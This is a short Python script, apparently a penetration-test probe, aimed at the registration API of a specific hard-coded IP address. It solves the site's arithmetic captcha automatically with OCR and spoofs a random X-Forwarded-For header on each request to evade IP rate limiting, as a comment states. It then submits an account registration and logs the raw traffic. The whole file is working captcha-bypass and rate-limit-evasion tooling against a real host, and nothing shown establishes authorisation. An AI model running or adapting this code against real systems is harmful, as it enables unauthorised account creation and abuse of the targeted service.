#!/usr/bin/env python3
"""Minimal register-openness probe: 1 captcha -> 1 register request. Logs raw req/resp to disk."""
import base64, json, re, sys, time, random
import requests, ddddocr

BASE = 'http://144.123.22.234:9080/prod-api'
CLIENT_ID = '7882175c171521a945ee6bdd5580377f'
std = ddddocr.DdddOcr(show_ad=False)
beta = ddddocr.DdddOcr(beta=True, show_ad=False)
LOG = open('probe.log', 'a', encoding='utf-8')

def log(*a):
    s = ' '.join(str(x) for x in a)
    print(s); LOG.write(s + '\n'); LOG.flush()

def parse(t):
    t = (t.replace('×', '*').replace('✕', '*').replace('x', '*').replace('X', '*')
          .replace('＋', '+').replace('一', '-').replace('—', '-'))
    m = re.search(r'(\d)\s*([+\-*])\s*(\d)', t)
    if not m:
        return None
    a, op, c = int(m.group(1)), m.group(2), int(m.group(3))
    return {'+': a + c, '-': a - c, '*': a * c}[op], '%d%s%d' % (a, op, c)

def get_code(tag):
    # fresh XFF per request: IP rate-limiter key is X-Forwarded-For (fact 28936)
    xff = '10.%d.%d.%d' % (random.randint(1, 250), random.randint(1, 250), random.randint(1, 250))
    h = {'X-Forwarded-For': xff, 'User-Agent': 'pentest-audit/1.0'}
    t0 = time.time()
    r = requests.get(BASE + '/auth/code', headers=h, timeout=20)
    log('[%s] CODE GET xff=%s -> %s %s' % (tag, xff, r.status_code, r.text[:200]))
    open('code_%s.json' % tag, 'w').write(r.text)
    d = r.json()
    if d.get('code') != 200 or not d.get('data'):
        return None
    data = d['data']
    img = base64.b64decode(data['img'])
    open('cap_%s.png' % tag, 'wb').write(img)
    tb = beta.classification(img); ts = std.classification(img)
    ans = expr = None
    for t2 in (tb, ts):
        p = parse(t2)
        if p:
            ans, expr = p; break
    log('[%s] OCR beta=%r std=%r expr=%s ans=%s (%.1fs)' % (tag, tb, ts, expr, ans, time.time() - t0))
    return {'uuid': data['uuid'], 'ans': ans, 'expr': expr, 'tb': tb, 'ts': ts}

def register(tag, codeinfo, username, password, extra=None):
    body = {"tenantId": "000000", "username": username, "password": password,
            "confirmPassword": password, "code": str(codeinfo['ans']),
            "uuid": codeinfo['uuid'], "userType": "sys_user",
            "clientId": CLIENT_ID, "grantType": "password"}
    if extra:
        body.update(extra)
    h = {'Content-Type': 'application/json;charset=utf-8', 'clientid': CLIENT_ID,
         'User-Agent': 'pentest-audit/1.0'}
    r = requests.post(BASE + '/auth/register', headers=h, data=json.dumps(body), timeout=25)
    log('[%s] REGISTER %s -> HTTP %s %s' % (tag, json.dumps(body, ensure_ascii=False), r.status_code, r.text[:500]))
    open('register_%s.json' % tag, 'w').write(json.dumps(
        {'req': body, 'status': r.status_code, 'resp': r.text}, ensure_ascii=False, indent=1))
    return r.status_code, r.text

if __name__ == '__main__':
    tag = sys.argv[1] if len(sys.argv) > 1 else 'base'
    user = sys.argv[2] if len(sys.argv) > 2 else 'pentest_aud_%04d' % random.randint(0, 9999)
    ci = get_code(tag)
    if not ci or ci['ans'] is None:
        log('[%s] NO_USABLE_CODE (ans=%r)' % (tag, ci))
        sys.exit(2)
    time.sleep(3)
    register(tag, ci, user, 'Pt#2024aB9x')
